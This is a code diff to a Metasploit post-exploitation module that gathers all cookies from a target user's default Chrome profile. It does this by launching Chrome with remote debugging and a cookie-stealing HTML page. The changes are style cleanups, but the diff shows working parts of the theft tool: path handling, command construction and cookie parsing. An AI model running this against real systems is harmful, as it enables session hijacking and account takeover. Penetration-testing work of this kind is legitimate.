@@ -7,19 +7,22 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Chrome Gather Cookies',
-      'Description' =>
-        "Read all cookies from the Default Chrome profile of the target user.",
-      'License' => MSF_LICENSE,
-      'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
-      'Platform' => %w[linux unix bsd osx windows],
-      'SessionTypes' => %w[meterpreter shell]))
+    super(
+      update_info(
+        info,
+        'Name' => 'Chrome Gather Cookies',
+        'Description' => 'Read all cookies from the Default Chrome profile of the target user.',
+        'License' => MSF_LICENSE,
+        'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
+        'Platform' => %w[linux unix bsd osx windows],
+        'SessionTypes' => %w[meterpreter shell]
+      )
+    )
 
     register_options(
       [
         OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
-        OptString.new('WRITEABLE_DIR', [false, 'Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\\Local\\Temp)', ""]),
+        OptString.new('WRITEABLE_DIR', [false, 'Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\\Local\\Temp)', '']),
         OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
       ]
     )
@@ -42,12 +45,12 @@ class MetasploitModule < Msf::Post
     when 'unix', 'linux', 'bsd', 'python'
       chrome = 'google-chrome'
       user_data_dir = "/home/#{username}/.config/google-chrome"
-      temp_storage_dir = temp_storage_dir.nil? ? "/tmp" : temp_storage_dir
+      temp_storage_dir = temp_storage_dir.nil? ? '/tmp' : temp_storage_dir
       @cookie_storage_path = "#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}"
     when 'osx'
       chrome = '"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"'
       user_data_dir = expand_path "/Users/#{username}/Library/Application Support/Google/Chrome"
-      temp_storage_dir = temp_storage_dir.nil? ? "/tmp" : temp_storage_dir
+      temp_storage_dir = temp_storage_dir.nil? ? '/tmp' : temp_storage_dir
       @cookie_storage_path = "#{temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}"
     when 'windows'
       chrome = '"\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"'
@@ -101,7 +104,7 @@ class MetasploitModule < Msf::Post
     chrome_debugging_args << " --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']}"
     chrome_debugging_args << " #{@html_storage_path}"
 
-    @chrome_debugging_cmd = "#{chrome} #{chrome_debugging_args.join(" ")}"
+    @chrome_debugging_cmd = "#{chrome} #{chrome_debugging_args.join(' ')}"
   end
 
   def create_cookie_stealing_html(temp_storage_dir)
@@ -165,7 +168,7 @@ class MetasploitModule < Msf::Post
 
   def get_cookies
     if session.platform == 'windows'
-      chrome_cmd = "#{@chrome_debugging_cmd}"
+      chrome_cmd = @chrome_debugging_cmd.to_s
       kill_cmd = 'taskkill /f /pid'
     else
       chrome_cmd = "#{@chrome_debugging_cmd} > #{@cookie_storage_path} 2>&1"
@@ -195,17 +198,17 @@ class MetasploitModule < Msf::Post
     end
 
     cookies_msg = ''
-    chrome_output.each_line {|line|
+    chrome_output.each_line do |line|
       if line =~ /REMOTE_DEBUGGING/
         print_good('Found Match')
         cookies_msg = line
       end
-    }
+    end
 
     fail_with(Failure::Unknown, 'Failed to retrieve cookie data') if cookies_msg.empty?
 
     # Slice off the "REMOTE_DEBUGGING|" delimiter and trailing source info
-    cookies_json = cookies_msg.split("REMOTE_DEBUGGING|")[1]
+    cookies_json = cookies_msg.split('REMOTE_DEBUGGING|')[1]
     cookies_json.split('", source: file')[0]
   end
 
